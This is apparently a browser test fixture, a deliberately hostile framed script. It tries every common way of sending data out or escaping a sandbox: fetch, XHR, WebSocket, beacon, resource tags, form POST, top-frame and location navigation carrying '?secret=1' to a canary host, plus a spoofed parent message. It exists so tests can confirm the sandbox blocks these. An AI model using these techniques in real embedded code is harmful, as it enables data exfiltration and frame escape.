/* eslint-disable no-undef -- a browser script, served to a frame; it is not linted for browser globals */
// A hostile app: plain script, no SDK, one attack chosen by `?a=` against the canary origin `?c=`.
// It runs the moment it loads and writes what each attempt did into `window.__r` / the DOM.
(function () {
  var q = new URLSearchParams(location.search);
  var attack = q.get("a") || "idle";
  var canary = q.get("c") || "http://127.0.0.1:1";
  var results = {};
  // tell the page this document is running, so a spec can tell "blocked" from "never loaded"
  try { parent.postMessage({ e2e: "ran", attack: attack }, "*"); } catch { /* nothing to tell */ }
  function note(name, value) {
    results[name] = value;
    var node = document.getElementById("r");
    if (node) node.textContent = JSON.stringify(results);
  }
  function tryIt(name, fn) {
    try {
      note(name, "ran:" + String(fn()).slice(0, 40));
    } catch (e) {
      note(name, "threw:" + (e && e.name));
    }
  }
  function settle(name, promise) {
    promise.then(
      function (v) { note(name, "allowed:" + String(v).slice(0, 40)); },
      function (e) { note(name, "blocked:" + (e && e.name)); },
    );
  }
  function element(name, tag, attrs) {
    var el = document.createElement(tag);
    Object.keys(attrs).forEach(function (k) { el.setAttribute(k, attrs[k]); });
    el.onload = function () { note(name, "loaded"); };
    el.onerror = function () { note(name, "error-event"); };
    document.body.appendChild(el);
  }

  function run() {
  if (attack === "net") {
    settle("fetch",fetch(canary + "/fetch?s=1", { mode: "no-cors" }).then(function (r) { return r.type; }));
    settle("fetch-same-origin", fetch("/hostile.js").then(function (r) { return r.status; }));
    settle("fetch-data", fetch("data:text/plain,x").then(function (r) { return r.status; }));
    note("xhr", "pending");
    var x = new XMLHttpRequest();
    x.open("GET", canary + "/xhr?s=1");
    x.onload = function () { note("xhr", "allowed"); };
    x.onerror = function () { note("xhr", "blocked"); };
    try { x.send(); } catch (e) { note("xhr", "threw:" + e.name); }
    tryIt("websocket", function () {
      var w = new WebSocket(canary.replace("http", "ws") + "/ws?s=1");
      w.onopen = function () { note("websocket", "open"); };
      w.onerror = function () { note("websocket", "blocked"); };
      return "created";
    });
    tryIt("eventsource", function () {
      var es = new EventSource(canary + "/es?s=1");
      es.onerror = function () { es.close(); note("eventsource", "blocked"); };
      return "created";
    });
    tryIt("beacon", function () { return navigator.sendBeacon(canary + "/beacon?s=1", "x"); });
    element("img", "img", { src: canary + "/img.png?s=1" });
    element("script", "script", { src: canary + "/s.js?s=1" });
    element("css", "link", { rel: "stylesheet", href: canary + "/c.css?s=1" });
    element("audio", "audio", { src: canary + "/a.mp3?s=1" });
    element("iframe", "iframe", { src: canary + "/frame?s=1" });
    tryIt("form", function () {
      var f = document.createElement("form");
      f.method = "POST";
      f.action = canary + "/form?s=1";
      document.body.appendChild(f);
      f.submit();
      return "submitted";
    });
    tryIt("window.open", function () { return window.open(canary + "/open?s=1") === null ? "null" : "opened"; });
    tryIt("top.location.read", function () { return top.location.href; });
    tryIt("top.location.assign", function () { top.location = canary + "/top?s=1"; return "assigned"; });
    tryIt("parent.document", function () { return parent.document.title; });
    tryIt("cookie", function () { document.cookie = "a=b"; return document.cookie; });
    tryIt("localStorage", function () { return typeof window.localStorage; });
    tryIt("indexedDB", function () { return typeof indexedDB.open("x"); });
    tryIt("eval", function () { return eval("1+1"); });
  } else if (attack === "nav-href") {
    tryIt("nav", function () { location.href = canary + "/nav-href?secret=1"; return "set"; });
  } else if (attack === "nav-replace") {
    tryIt("nav", function () { location.replace(canary + "/nav-replace?secret=1"); return "replaced"; });
  } else if (attack === "nav-assign") {
    tryIt("nav", function () { document.location.assign(canary + "/nav-assign?secret=1"); return "assigned"; });
  } else if (attack === "nav-meta") {
    tryIt("nav", function () {
      var m = document.createElement("meta");
      m.httpEquiv = "refresh";
      m.content = "0;url=" + canary + "/nav-meta?secret=1";
      document.head.appendChild(m);
      return "added";
    });
  } else if (attack === "nav-anchor") {
    tryIt("nav", function () {
      var a = document.createElement("a");
      a.href = canary + "/nav-anchor?secret=1";
      a.target = "_self";
      document.body.appendChild(a);
      a.click();
      return "clicked";
    });
  } else if (attack === "spoof") {
    // a sibling frame pretending to be the app: say hello to the page
    parent.postMessage({ pqp: "app-hello", platformApi: 1 }, "*");
    note("spoof", "posted");
  } else {
    note("idle", "idle");
  }
  }

  // `?d=<ms>`: wait for this document's own load event, then attack (a frame that already loaded once)
  if (q.get("d")) {
    window.addEventListener("load", function () { setTimeout(run, Number(q.get("d"))); });
  } else {
    run();
  }
})();
